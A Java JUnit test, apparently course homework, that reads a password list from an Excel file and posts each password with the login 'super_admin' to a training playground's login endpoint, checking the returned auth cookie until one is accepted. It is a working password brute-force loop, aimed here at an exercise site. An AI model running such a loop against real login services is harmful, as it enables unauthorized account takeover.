import io.restassured.RestAssured;
import io.restassured.http.Headers;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.apache.commons.math3.optimization.direct.CMAESOptimizer;
import org.apache.poi.hssf.usermodel.HSSFWorkbook;
import org.apache.poi.poifs.filesystem.POIFSFileSystem;
import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.junit.jupiter.api.Test;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.lang.reflect.Type;
import java.util.HashMap;
import java.util.Map;


public class HelloWorldTest {
    @Test
    public void testHelloWorld() throws IOException {

        String file = "C:/Users/marat/Downloads/passlist (2).xlsx";
        String status;

        String pass = null;
        XSSFWorkbook wb = new XSSFWorkbook(new FileInputStream(file));

        for (int i = 0; i <= 24; i++) {
            for (int j = 0; j <= 8; j++) {

                pass = wb.getSheetAt(0).getRow(i).getCell(j).getStringCellValue();

                Map<String, String> data = new HashMap<>();
                data.put("login", "super_admin");
                data.put("password", pass);

                Response response = RestAssured
                        .given()
                        .body(data)
                        .when()
                        .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                        .andReturn();

                String responseCookie = response.getCookie("auth_cookie");
                //System.out.println(responseCookie);

                Map<String, String> cookies = new HashMap<>();
                cookies.put("auth_cookie", responseCookie);

                Response responseForCheck = RestAssured
                        .given()
                        .body(data)
                        .cookies(cookies)
                        .when()
                        .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                        .andReturn();


                status = responseForCheck.asString();

                if(status.equals("You are authorized"))  {
                    System.out.println(pass);
                    return;
                }
            }
        }
    }
}
